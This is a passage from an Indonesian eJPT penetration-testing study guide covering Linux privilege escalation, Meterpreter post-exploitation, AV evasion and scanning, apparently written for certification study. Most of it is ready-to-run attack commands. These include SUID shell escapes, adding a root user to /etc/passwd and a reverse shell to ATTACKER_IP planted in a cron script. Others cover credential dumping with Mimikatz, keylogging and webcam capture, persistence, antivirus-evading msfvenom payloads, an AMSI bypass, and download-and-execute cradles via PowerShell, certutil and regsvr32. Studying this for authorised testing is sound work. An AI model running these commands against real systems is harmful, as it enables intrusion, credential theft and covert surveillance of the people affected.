# Temukan SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Eksploitasi dengan GTFOBins
# Contoh: /usr/bin/find dengan SUID
/usr/bin/find . -exec /bin/sh -p \; -quit

# Contoh: /usr/bin/python dengan SUID
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# Contoh: /bin/bash dengan SUID
/bin/bash -p    # -p preserves SUID
```

**3. Writable /etc/passwd**

```bash
# Cek jika /etc/passwd bisa ditulis
ls -la /etc/passwd

# Jika writable, tambahkan user root baru
# Generate password hash
openssl passwd -1 -salt salt newpassword
# Atau: python3 -c "import crypt; print(crypt.crypt('newpass', '\$1\$salt\$'))"

# Tambahkan line ke /etc/passwd
echo 'hacker:$1$salt$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd

# Login sebagai user baru
su hacker
```

**4. Cron Job Exploitation**

```bash
# Lihat cron jobs
cat /etc/crontab

# Jika ada script yang dijalankan root dan bisa kita tulis
ls -la /path/to/cron/script.sh

# Jika writable, tambahkan reverse shell atau privilege escalation
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /path/to/cron/script.sh

# Atau buat user baru
echo 'echo "hacker:x:0:0::/root:/bin/bash" >> /etc/passwd' >> /path/to/cron/script.sh
echo 'echo "hacker::17000:0:99999:7:::" >> /etc/shadow' >> /path/to/cron/script.sh
```

**5. Linux Capabilities**

```bash
# Cek capabilities
getcap -r / 2>/dev/null

# Contoh berbahaya: python3 dengan cap_setuid
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

# Contoh: perl dengan cap_setuid
/usr/bin/perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### Tools Otomatis Linux PrivEsc

```bash
# LinPEAS (paling lengkap)
chmod +x linpeas.sh
./linpeas.sh | tee output.txt

# LinEnum
chmod +x LinEnum.sh
./LinEnum.sh -t

# Linux Exploit Suggester
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh

# Via Meterpreter
meterpreter> run post/multi/recon/local_exploit_suggester
```

---

## 7. Post-Exploitation

### Meterpreter — Perintah Lengkap

#### System Information

```bash
sysinfo                    # OS, hostname, arsitektur
getuid                     # user saat ini
getpid                     # PID proses Meterpreter
ps                         # list proses
getsystem                  # coba escalate ke SYSTEM
```

#### File System

```bash
pwd                        # direktori saat ini
ls                         # list file
cd C:\\Users\\admin        # pindah direktori
cat file.txt               # baca file
upload /local/file.exe C:\\remote\\file.exe
download C:\\remote\\file.txt /local/
search -f *.txt            # cari file
edit file.txt              # edit file
rm file.txt                # hapus file
mkdir NewFolder            # buat direktori
```

#### Networking

```bash
ifconfig                   # network interfaces
route                      # routing table
portfwd add -l 8080 -p 80 -r TARGET_INTERNAL    # port forwarding
run post/multi/manage/autoroute SUBNET=192.168.2.0/24  # add route
```

#### Credential Harvesting

```bash
hashdump                   # dump local user hashes
run post/windows/gather/hashdump
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_logged_on_users

# Mimikatz
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
dcsync_ntlm DOMAIN\\user   # domain credential dump
```

#### Pivoting & Lateral Movement

```bash
# Setup SOCKS proxy via Meterpreter
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 5
run -j

# Add route ke subnet internal
run post/multi/manage/autoroute SUBNET=192.168.2.0 NETMASK=255.255.255.0

# Atau manual
route add 192.168.2.0/24 SESSION_ID

# Konfigurasi proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# Scan jaringan internal melalui pivot
proxychains nmap -sT -p 22,80,445 192.168.2.0/24
```

#### Persistence

```bash
# Windows Registry Autorun
run post/windows/manage/persistence_exe STARTUP=REGISTRY

# Startup folder
run post/windows/manage/persistence_exe STARTUP=STARTUP

# Scheduled task
run post/windows/manage/persistence_exe STARTUP=SCHEDULER

# Linux crontab persistence
run post/linux/manage/cron_persistence
```

#### Miscellaneous

```bash
screenshot                 # tangkap screenshot
keyscan_start              # mulai keylogger
keyscan_dump               # dump keystrokes
keyscan_stop               # hentikan keylogger
webcam_list                # list webcam
webcam_snap                # ambil foto webcam
run post/multi/gather/env  # environment variables
shell                      # masuk ke shell OS
migrate PID                # pindah ke proses lain (lebih stabil)
```

---

## 8. AV Evasion

### Enkoding Payload

```bash
# Lihat encoder yang tersedia
msfvenom --list encoders

# Encode dengan shikata_ga_nai (paling populer)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 3 \
  -f exe -o encoded_shell.exe

# Iterasi lebih banyak = lebih sulit dideteksi (tapi ada batasnya)
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -e x86/shikata_ga_nai -i 10 \
  -f exe -o encoded_shell.exe
```

### PowerShell Evasion

```powershell
# Bypass execution policy
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER/shell.ps1')"

# Base64 encode command
$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://IP/shell.ps1')"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell -EncodedCommand $encoded

# AMSI Bypass (di PowerShell session)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

### Template Injection & Living Off The Land

```bash
# Gunakan certutil untuk download (sudah ada di Windows)
certutil -urlcache -f http://ATTACKER/shell.exe shell.exe

# Gunakan bitsadmin
bitsadmin /transfer job /download /priority normal http://ATTACKER/shell.exe C:\shell.exe

# Gunakan regsvr32 (bypass AppLocker)
regsvr32 /s /n /u /i:http://ATTACKER/malicious.sct scrobj.dll
```

---

## 9. Vulnerability Scanning

### Nmap Vulnerability Scanning

```bash
# Scan kerentanan umum
nmap --script vuln TARGET_IP

# Scan kerentanan spesifik
nmap --script smb-vuln* -p 445 TARGET_IP
nmap --script http-vuln* -p 80,443 TARGET_IP
nmap --script rdp-vuln* -p 3389 TARGET_IP
nmap --script ftp-anon -p 21 TARGET_IP

# Scan kerentanan dengan output detail
nmap -sV --script vuln -oN vuln_scan.txt TARGET_IP
nmap -sV --script vuln -oX vuln_scan.xml TARGET_IP

# Full scan (lambat tapi lengkap)
nmap -sV -sC -O --script vuln -p- TARGET_IP -oN full_scan.txt
```

### Nikto — Web Server Scanner

```bash
# Scan dasar
nikto -h http://TARGET_IP

# Scan dengan port spesifik
nikto -h http://TARGET_IP -p 8080

# Scan HTTPS
nikto -h https://TARGET_IP -ssl

# Scan dengan autentikasi
nikto -h http://TARGET_IP -id admin:password

# Output ke file
nikto -h http://TARGET_IP -o report.html -Format html
```

---

## 10. Cheat Sheet & Quick Reference

### Ports Penting

| Port | Service | Attack Vector |
|---|---|---|
| 21 | FTP | Brute force, anonymous login, vsFTPd backdoor |
| 22 | SSH | Brute force, private key |
| 23 | Telnet | Brute force, sniffing (cleartext) |
| 25 | SMTP | Enum users, relay |
| 80/443 | HTTP/HTTPS | Web exploits, WebDAV, shellshock |
| 139/445 | SMB | EternalBlue, PsExec, brute force |
| 3306 | MySQL | Brute force, SQL injection |
| 3389 | RDP | BlueKeep, brute force |
| 5985/5986 | WinRM | Brute force, evil-winrm |

### Quick Win Commands

```bash
# ─── RECON ─────────────────────────────────────────────────
nmap -sV -sC -O -p- TARGET_IP -oN scan.txt
nmap --script vuln TARGET_IP

# ─── SMB ───────────────────────────────────────────────────
enum4linux -a TARGET_IP
smbmap -H TARGET_IP
smbclient -L //TARGET_IP/ -N

# ─── WEB ───────────────────────────────────────────────────
nikto -h http://TARGET_IP
gobuster dir -u http://TARGET_IP -w /usr/share/wordlists/dirb/common.txt

# ─── EXPLOIT ───────────────────────────────────────────────
# EternalBlue
use exploit/windows/smb/ms17_010_eternalblue

# WebDAV
use exploit/windows/iis/iis_webdav_upload_asp

# Shellshock
use exploit/multi/http/apache_mod_cgi_bash_env_exec

# ─── PRIVESC ───────────────────────────────────────────────
# Windows
meterpreter> run post/multi/recon/local_exploit_suggester
# Upload winpeas.exe

# Linux
find / -perm -4000 -type f 2>/dev/null
sudo -l
cat /etc/crontab

# ─── HASH CRACK ────────────────────────────────────────────
hashcat -m 1000 ntlm_hashes.txt rockyou.txt       # NTLM
hashcat -m 1800 linux_shadow.txt rockyou.txt       # SHA-512 Linux
john --wordlist=rockyou.txt hashes.txt
```

### Payload Quick Reference

```bash
# Windows x64 Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f exe -o win.exe

# Linux Meterpreter
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f elf -o lin.elf

# PHP Shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw -o shell.php

# Multi/handler listener
use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; run -j
```

### GTFOBins — SUID & Sudo Exploitation

Referensi lengkap: https://gtfobins.github.io/

```bash
# Pola umum untuk SUID/sudo
# find
sudo find . -exec /bin/sh \; -quit
find . -exec /bin/sh -p \; -quit

# python/python3
sudo python3 -c 'import os; os.system("/bin/bash")'

# perl
sudo perl -e 'exec "/bin/bash";'

# ruby
sudo ruby -e 'exec "/bin/bash"'

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# vim/vi
sudo vim -c ':!/bin/bash'

# less/more
sudo less /etc/passwd
!/bin/bash

# man
sudo man ls
!/bin/bash

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

---

## 📚 Referensi & Sumber Belajar

| Sumber | URL |
|---|---|
| eJPT Certification | https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester |
| GTFOBins | https://gtfobins.github.io/ |
| HackTricks | https://book.hacktricks.xyz/ |
| LOLBAS (Windows) | https://lolbas-project.github.io/ |
| CVE Database | https://cve.mitre.org/ |
| Exploit-DB | https://www.exploit-db.com/ |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings |
| SecLists (wordlists) | https://github.com/danielmiessler/SecLists |

---

*📅 Dibuat untuk studi eJPT — System/Host Based Attacks*
*⚠️ Gunakan hanya di lingkungan yang telah mendapat izin*
